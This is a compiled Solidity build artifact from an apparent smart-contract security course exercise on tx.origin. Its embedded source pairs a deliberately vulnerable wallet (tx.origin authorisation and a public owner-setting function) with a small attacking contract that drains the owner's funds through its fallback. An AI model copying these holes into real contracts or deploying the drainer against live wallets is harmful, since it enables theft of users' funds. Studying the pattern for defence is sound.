{
  "contractName": "MyContract",
  "abi": [
    {
      "inputs": [],
      "name": "myContract",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "sendTo",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506102cb806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80639e1a00aa1461003b578063bc33657a14610057575b600080fd5b6100556004803603810190610050919061020f565b610061565b005b61005f610134565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff16146100b957600080fd5b60008273ffffffffffffffffffffffffffffffffffffffff16826040516100df90610280565b60006040518083038185875af1925050503d806000811461011c576040519150601f19603f3d011682016040523d82523d6000602084013e610121565b606091505b505090508061012f57600080fd5b505050565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101a68261017b565b9050919050565b6101b68161019b565b81146101c157600080fd5b50565b6000813590506101d3816101ad565b92915050565b6000819050919050565b6101ec816101d9565b81146101f757600080fd5b50565b600081359050610209816101e3565b92915050565b6000806040838503121561022657610225610176565b5b6000610234858286016101c4565b9250506020610245858286016101fa565b9150509250929050565b600081905092915050565b50565b600061026a60008361024f565b91506102758261025a565b600082019050919050565b600061028b8261025d565b915081905091905056fea2646970667358221220f06f5d07546d4e6fbba45d2630e9f5e2c0ae61ec55b4bf4df43f64fb4d185dd364736f6c634300080c0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.12;\r\n\r\ncontract MyContract {\r\n\r\n    address owner;\r\n\r\n    function myContract() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function sendTo(address receiver, uint amount) public {\r\n        require(tx.origin == owner);\r\n        (bool success, ) = receiver.call{value:amount}(\"\");\r\n        require(success);\r\n    }\r\n\r\n}\r\n\r\ncontract AttackingContract {\r\n\r\n    MyContract myContract;\r\n    address attacker;\r\n\r\n    function attackingContract(address myContractAddress) public {\r\n        myContract = MyContract(myContractAddress);\r\n        attacker = msg.sender;\r\n    }\r\n\r\n    fallback() external {\r\n        myContract.sendTo(attacker, msg.sender.balance);\r\n    }\r\n\r\n}\r\n",
  "sourcePath": "C:\\Users\\yanni\\Documents\\Formation Alyra\\Solidity_security\\contracts\\05_TxOrigin.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.12+commit.f00d7308.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-02-22T23:05:47.721Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}